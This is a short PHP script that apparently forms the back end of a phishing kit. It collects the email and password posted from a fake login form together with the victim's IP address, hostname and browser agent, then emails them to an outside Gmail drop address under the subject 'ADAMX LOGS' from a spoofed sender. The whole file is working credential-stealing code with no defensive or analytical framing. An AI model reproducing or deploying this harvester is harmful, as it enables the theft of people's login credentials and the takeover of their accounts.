<?php

ini_set( 'display_errors', 1 );
error_reporting( E_ALL );

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];


//Getting UserID info from Session
$username = $_POST['x1'];
$password = $_POST['x2'];

$mesaj="==================+[ User Info  ]+==================
Email: $username
Password   : $password
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";
    $from = "noreply@purchaseitems.xyz";
 $headers = "From:" . $from;
$subject = "ADAMX  LOGS";
if(mail('obiomastanleynewlogs@gmail.com', $subject,$mesaj,$headers)){
    echo "sent";
}else{
    echo "not sent";
}

?>




